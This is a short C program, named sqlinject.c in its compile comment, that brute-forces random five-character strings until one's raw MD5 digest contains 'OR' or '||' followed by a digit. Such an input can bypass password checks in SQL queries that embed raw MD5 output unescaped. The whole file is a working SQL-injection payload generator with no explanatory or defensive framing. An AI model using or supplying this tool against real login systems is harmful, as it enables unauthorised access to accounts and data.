#include <stdio.h>
#include <string.h>
#include <openssl/md5.h>
#include <stdlib.h>
#include<time.h>

    //gcc -I/usr/local/Cellar/openssl/1.0.2o_1/include sqlinject.c -lssl -lcrypto


unsigned char digest[MD5_DIGEST_LENGTH];
char * found;

char alphabet[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

void find_hash(char *string){

    MD5((unsigned char*) string, strlen(string), digest);

        // find || or any case of OR
    found = strcasestr(digest, "'OR'");
    if(found == NULL){
        found = strstr(digest, "'||'");
    }

    if((found != NULL) && (found[4] > '0') && (found[4] <= '9')) {
        printf("string is %s\n", string);
        printf("md5 digest: %s\n", digest);
            // printf("raw:     %s\n", digest);
        exit(0);
    }
}

int main(){

    srand(time(NULL));

    while(1){

    char string[6];
    for (int i = 0; i < 5; ++i) {
            string[i] = alphabet[rand() % (sizeof(alphabet) - 1)];
    }

    string[5] = 0;

    find_hash(string);
    }
    return 0;

}
